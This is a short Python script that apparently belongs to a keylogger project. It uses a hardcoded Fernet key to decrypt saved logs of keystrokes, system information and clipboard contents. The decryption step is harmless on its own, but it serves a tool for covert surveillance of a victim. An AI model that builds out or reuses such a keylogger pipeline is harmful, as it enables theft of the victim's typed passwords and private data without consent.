from cryptography.fernet import Fernet

key = "BwfsyeHY8dYxyMr2tT0MEdg9Z6h7R7yN_i-yaiegGPI="

keys_information_e = "key_log_e.txt"
system_information_e = "system_info_e.txt"
clipboard_information_e = "clipboard_e.txt"

encrypted_files = [keys_information_e, system_information_e, clipboard_information_e]
count = 0

for decrypting_file in encrypted_files:
    with open(encrypted_files[count], "rb") as f:
        data = f.read()
    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)
    with open(encrypted_files[count], "wb") as f:
        f.write(decrypted)
    count += 1